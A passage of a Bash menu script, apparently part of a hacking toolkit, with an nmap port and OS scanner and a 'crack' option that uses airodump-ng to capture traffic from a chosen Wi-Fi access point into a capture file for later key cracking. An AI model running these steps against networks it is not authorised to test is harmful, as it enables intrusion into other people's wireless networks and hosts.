echo   ------------------------
echo      - ports scaner -
echo   ------------------------
echo 
echo
echo -e ' \e[1;31m '

read -p ' ip de la machine : ' ipm

nmap -sV -v -Pn -sT -PN -T4 -O -F -A --version-ligh $ipm
fi



if [ $choix = "crack" ]
then
clear
read -p 'interface : ' winterface
airodump-ng $winterface
clear
echo
echo -e '\e[1;33m '
echo choose acces point
echo 
echo -e ' \e[1;31m '
read -p 'bssid: ' apbssid
read -p 'chanel : ' apch
xterm -e airodump-ng -c $apch --bssid $apbssid -w gs-tool.cap $winterface
